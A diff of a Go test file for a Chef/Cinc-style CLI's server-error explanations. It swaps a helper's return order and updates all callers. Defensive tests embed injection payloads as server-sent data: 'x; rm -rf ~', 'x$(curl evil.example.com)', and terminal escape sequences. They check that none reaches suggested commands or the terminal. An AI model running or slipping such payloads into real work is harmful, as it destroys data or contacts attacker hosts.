@@ -19,7 +19,7 @@ import (
 // serverError sends one signed request to an httptest server that answers
 // status with body, and returns the error cinc-api built from it, so each
 // case explains exactly what the real client hands the CLI.
-func serverError(t *testing.T, method, path string, status int, body string) (error, Target) {
+func serverError(t *testing.T, method, path string, status int, body string) (Target, error) {
 	t.Helper()
 	t.Setenv("HOME", t.TempDir())
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
@@ -43,7 +43,7 @@ func serverError(t *testing.T, method, path string, status int, body string) (er
 	if err == nil {
 		t.Fatalf("%s %s: want a %d error", method, path, status)
 	}
-	return err, TargetFor("default", "/home/tim/.cinc/credentials", p)
+	return TargetFor("default", "/home/tim/.cinc/credentials", p), err
 }
 
 // wantMentions fails unless msg contains every want.
@@ -78,7 +78,7 @@ func explainServer(t *testing.T, raw error, target Target) string {
 // web1". The explanation comes from the path, so either works.
 func TestExplainNotFoundNamesTheObjectAndTheListCommand(t *testing.T) {
 	for _, body := range []string{`{"error":["Cannot load node web1"]}`, `{"error":["Cannot find nodes web1"]}`} {
-		raw, target := serverError(t, "GET", "/organizations/acme/nodes/web1", 404, body)
+		target, raw := serverError(t, "GET", "/organizations/acme/nodes/web1", 404, body)
 		msg := explainServer(t, raw, target)
 		wantMentions(t, msg,
 			`we couldn't find node "web1" in organization "acme"`,
@@ -119,7 +119,7 @@ func TestExplainNotFoundShapes(t *testing.T) {
 		{"/users/bob/keys", `{"error":["Cannot find users bob"]}`,
 			[]string{`we couldn't find user "bob"`, prog + " user list"}},
 	} {
-		raw, target := serverError(t, "GET", tc.path, 404, tc.body)
+		target, raw := serverError(t, "GET", tc.path, 404, tc.body)
 		wantMentions(t, explainServer(t, raw, target), tc.want...)
 	}
 }
@@ -129,7 +129,7 @@ func TestExplainNotFoundShapes(t *testing.T) {
 // the profile's server URL is. erchef and cinc-server-ng word it differently.
 func TestExplainNotFoundOrganization(t *testing.T) {
 	for _, body := range []string{`{"error":["Cannot find org acme"]}`, `{"error":"organization 'acme' does not exist."}`} {
-		raw, target := serverError(t, "GET", "/organizations/acme/nodes", 404, body)
+		target, raw := serverError(t, "GET", "/organizations/acme/nodes", 404, body)
 		msg := explainServer(t, raw, target)
 		wantMentions(t, msg, `organization "acme"`, "doesn't exist", target.ServerURL,
 			`"default" profile`, target.ConfigPath, progname.Get()+" org list")
@@ -140,7 +140,7 @@ func TestExplainNotFoundOrganization(t *testing.T) {
 }
 
 func TestExplainUnauthorizedWrongKey(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 401,
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 401,
 		`{"error":["Invalid signature for user or client 'tim'"]}`)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, `"tim"`, target.ServerURL, "client key", target.KeyPath,
@@ -149,7 +149,7 @@ func TestExplainUnauthorizedWrongKey(t *testing.T) {
 }
 
 func TestExplainUnauthorizedUnknownClient(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 401,
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 401,
 		`{"error":["Failed to authenticate as 'tim'. Ensure that your node_name and client key are correct."]}`)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, `doesn't know a client or user called "tim"`, `organization "acme"`,
@@ -157,7 +157,7 @@ func TestExplainUnauthorizedUnknownClient(t *testing.T) {
 }
 
 func TestExplainUnauthorizedClockSkew(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 401,
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 401,
 		`{"error":["Original request time stamp too far in the future or past."]}`)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, "clock", "time stamp too far", "401")
@@ -168,12 +168,12 @@ func TestExplainUnauthorizedClockSkew(t *testing.T) {
 
 // An unrecognized 401 still gets every likely cause.
 func TestExplainUnauthorizedOther(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 401, `{"error":["nope"]}`)
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 401, `{"error":["nope"]}`)
 	wantMentions(t, explainServer(t, raw, target), `"tim"`, "client key", "client_name", "clock", "nope")
 }
 
 func TestExplainForbidden(t *testing.T) {
-	raw, target := serverError(t, "DELETE", "/organizations/acme/nodes/web1", 403,
+	target, raw := serverError(t, "DELETE", "/organizations/acme/nodes/web1", 403,
 		`{"error":["missing delete permission"]}`)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, `"tim" isn't allowed to delete node "web1" in organization "acme"`,
@@ -181,7 +181,7 @@ func TestExplainForbidden(t *testing.T) {
 }
 
 func TestExplainForbiddenNotAMember(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 403,
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 403,
 		`{"error":["'tim' not associated with organization 'acme'"]}`)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, `"tim" isn't a member of organization "acme"`, progname.Get()+" org invite create tim",
@@ -189,20 +189,20 @@ func TestExplainForbiddenNotAMember(t *testing.T) {
 }
 
 func TestExplainConflict(t *testing.T) {
-	raw, target := serverError(t, "POST", "/organizations/acme/nodes", 409, `{"error":["Object already exists"]}`)
+	target, raw := serverError(t, "POST", "/organizations/acme/nodes", 409, `{"error":["Object already exists"]}`)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, `a node with that name already exists in organization "acme"`, "Object already exists", "409",
 		progname.Get()+" node list")
 }
 
 func TestExplainConflictUnderAParent(t *testing.T) {
-	raw, target := serverError(t, "POST", "/organizations/acme/clients/web1/keys", 409, `{"error":["Key already exists"]}`)
+	target, raw := serverError(t, "POST", "/organizations/acme/clients/web1/keys", 409, `{"error":["Key already exists"]}`)
 	wantMentions(t, explainServer(t, raw, target), `a key of client "web1" with that name already exists in organization "acme"`,
 		progname.Get()+" client key list web1")
 }
 
 func TestExplainBadRequestLeadsWithTheServerMessage(t *testing.T) {
-	raw, target := serverError(t, "POST", "/organizations/acme/clients", 400,
+	target, raw := serverError(t, "POST", "/organizations/acme/clients", 400,
 		`{"error":["Invalid public key"]}`)
 	msg := explainServer(t, raw, target)
 	if !strings.HasPrefix(msg, `the server refused the request: Invalid public key`) {
@@ -212,14 +212,14 @@ func TestExplainBadRequestLeadsWithTheServerMessage(t *testing.T) {
 }
 
 func TestExplainTooLarge(t *testing.T) {
-	raw, target := serverError(t, "PUT", "/organizations/acme/nodes/web1", 413,
+	target, raw := serverError(t, "PUT", "/organizations/acme/nodes/web1", 413,
 		`{"error":"JSON must be no more than 1000000 bytes."}`)
 	wantMentions(t, explainServer(t, raw, target), "too big", "JSON must be no more than 1000000 bytes.", "413")
 }
 
 func TestExplainServerFailure(t *testing.T) {
 	for _, status := range []int{500, 502, 503} {
-		raw, target := serverError(t, "POST", "/organizations/acme/nodes", status, `{"error":["internal service error"]}`)
+		target, raw := serverError(t, "POST", "/organizations/acme/nodes", status, `{"error":["internal service error"]}`)
 		msg := explainServer(t, raw, target)
 		wantMentions(t, msg, target.ServerURL, "not a problem with your command", "try again", "logs",
 			"internal service error", fmt.Sprint(status))
@@ -229,7 +229,7 @@ func TestExplainServerFailure(t *testing.T) {
 // A caller that only prefixed the server's error ("explore: ...") keeps its
 // prefix; the explanation replaces the raw text after it.
 func TestExplainKeepsAPrefixedWrapper(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/roles/web", 404, `{"error":["Cannot load role web"]}`)
+	target, raw := serverError(t, "GET", "/organizations/acme/roles/web", 404, `{"error":["Cannot load role web"]}`)
 	wrapped := fmt.Errorf("explore: %w", raw)
 	got := ExplainFor(wrapped, target)
 	msg := got.Error()
@@ -251,7 +251,7 @@ func (e *rewordedError) Unwrap() error { return e.err }
 // A command that already explained the error in its own words isn't
 // explained a second time.
 func TestExplainLeavesAnAlreadyExplainedServerErrorAlone(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes/web1/_acl", 403, `{"error":["missing grant permission"]}`)
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes/web1/_acl", 403, `{"error":["missing grant permission"]}`)
 	reworded := &rewordedError{err: raw}
 	if got := ExplainFor(reworded, target); got != reworded {
 		t.Errorf("ExplainFor rewrote an error a command already explained: %v", got)
@@ -261,7 +261,7 @@ func TestExplainLeavesAnAlreadyExplainedServerErrorAlone(t *testing.T) {
 // Without a target (the command never built a client from a profile) the
 // explanation still works; it just can't name the profile.
 func TestExplainWithoutTarget(t *testing.T) {
-	raw, _ := serverError(t, "GET", "/organizations/acme/nodes", 401,
+	_, raw := serverError(t, "GET", "/organizations/acme/nodes", 401,
 		`{"error":["Invalid signature for user or client 'tim'"]}`)
 	msg := explainServer(t, raw, Target{})
 	wantMentions(t, msg, `"tim"`, "client key")
@@ -273,11 +273,11 @@ func TestExplainWithoutTarget(t *testing.T) {
 // Statuses with nothing to add, and Explain itself, leave server errors as
 // they were.
 func TestExplainForLeavesOtherStatusesAlone(t *testing.T) {
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 418, `{"error":["teapot"]}`)
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 418, `{"error":["teapot"]}`)
 	if got := ExplainFor(raw, target); got != raw {
 		t.Errorf("ExplainFor(418) = %v, want it unchanged", got)
 	}
-	raw, _ = serverError(t, "GET", "/organizations/acme/nodes/web1", 404, `{"error":["Cannot load node web1"]}`)
+	_, raw = serverError(t, "GET", "/organizations/acme/nodes/web1", 404, `{"error":["Cannot load node web1"]}`)
 	if got := Explain(raw); got != raw {
 		t.Errorf("Explain(404) = %v, want it unchanged; ExplainFor is the one that explains server errors", got)
 	}
@@ -288,7 +288,7 @@ func TestExplainForLeavesOtherStatusesAlone(t *testing.T) {
 // server can't plant a shell command for the user to paste.
 func TestExplainKeepsServerTextOutOfSuggestedCommands(t *testing.T) {
 	body := `{"error":["Invalid signature for user or client 'x; rm -rf ~'"]}`
-	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 401, body)
+	target, raw := serverError(t, "GET", "/organizations/acme/nodes", 401, body)
 	msg := explainServer(t, raw, target)
 	wantMentions(t, msg, progname.Get()+" client reregister tim`", progname.Get()+" user key create tim <key-name>`")
 	if strings.Contains(msg, "reregister x") || strings.Contains(msg, "create x;") {
@@ -302,7 +302,7 @@ func TestExplainKeepsServerTextOutOfSuggestedCommands(t *testing.T) {
 		t.Errorf("a server-sent name reached a suggested command:\n%s", msg)
 	}
 
-	raw, _ = serverError(t, "GET", "/organizations/acme/nodes/web1", 403,
+	_, raw = serverError(t, "GET", "/organizations/acme/nodes/web1", 403,
 		`{"error":["'x$(curl evil.example.com)' not associated with organization 'acme'"]}`)
 	msg = explainServer(t, raw, target)
 	if strings.Contains(msg, "create x$(") || strings.Contains(msg, "add x$(") {
@@ -315,7 +315,7 @@ func TestExplainKeepsServerTextOutOfSuggestedCommands(t *testing.T) {
 // stripped before it is printed to the terminal.
 func TestExplainStripsControlCharactersFromServerText(t *testing.T) {
 	body := `{"error":["\u001b[2J\u001b[31mmissing delete permission\u001b[0m\u0007\rspoofed"]}`
-	raw, target := serverError(t, "DELETE", "/organizations/acme/nodes/web1", 403, body)
+	target, raw := serverError(t, "DELETE", "/organizations/acme/nodes/web1", 403, body)
 	msg := explainServer(t, raw, target)
 	for _, bad := range []string{"\x1b", "\x07", "\r"} {
 		if strings.Contains(msg, bad) {
@@ -324,7 +324,7 @@ func TestExplainStripsControlCharactersFromServerText(t *testing.T) {
 	}
 	wantMentions(t, msg, "missing delete permission", "spoofed")
 
-	raw, target = serverError(t, "POST", "/organizations/acme/clients", 400, `{"error":["bad\u001b]0;title\u0007 key"]}`)
+	target, raw = serverError(t, "POST", "/organizations/acme/clients", 400, `{"error":["bad\u001b]0;title\u0007 key"]}`)
 	if msg := explainServer(t, raw, target); strings.Contains(msg, "\x1b") || strings.Contains(msg, "\x07") {
 		t.Errorf("a 400 kept control characters:\n%q", msg)
 	}
